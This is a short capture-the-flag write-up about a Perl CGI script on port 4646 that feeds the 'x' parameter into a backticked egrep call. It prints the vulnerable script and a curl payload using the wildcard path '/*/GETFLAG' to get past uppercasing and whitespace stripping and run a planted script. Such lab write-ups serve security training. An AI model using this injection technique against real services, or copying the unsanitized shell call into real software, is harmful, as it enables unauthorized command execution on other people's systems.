In this level we have a perl server running on port 4646 accepting 2 pathParam x and y

base on the `level.pl` we can see that 
the param 'x' is can be use to do arbitrary code execution.
but we need to escape the formatting:
- it will be convert to uppercase
- any whitespace and all after it will be remove

```
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

We initally try to run the code but redirect does not work due to egrep.
Hence we try to call other script via. We create a script called /tmp/GETFLAG.
To escape the uppercase formatting but since its in the tmp we need to call it via absolute path however by calling it /tmp/GETFLAG, /tmp will be formatted.
hence we use wildcard to remove the /tmp resulting in the '`/*/GETFLAG`' as the payload.

by calling
'curl http://localhost:4646/?x='`/*/GETFLAG`'

we can now view the flag in /tmp/flag_11
